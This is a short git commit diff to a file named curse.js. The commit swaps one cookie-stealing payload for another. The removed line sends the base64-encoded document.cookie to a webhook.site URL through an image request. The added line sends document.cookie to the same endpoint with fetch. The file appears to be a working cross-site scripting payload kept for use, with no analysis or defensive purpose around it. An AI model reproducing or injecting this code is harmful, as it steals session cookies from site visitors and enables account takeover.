ddfa62212157203694d290314c44552e5c432867
edenon22 <edenon22h@proton.me>
2025-02-25 09:44:46 -0500

    Update curse.js

--- curse.js
+++ curse.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/f07ff620-ab52-4739-a61b-2f31504d3eb6?data='+btoa(document.cookie);
+fetch('https://webhook.site/f07ff620-ab52-4739-a61b-2f31504d3eb6?c=' + document.cookie)  
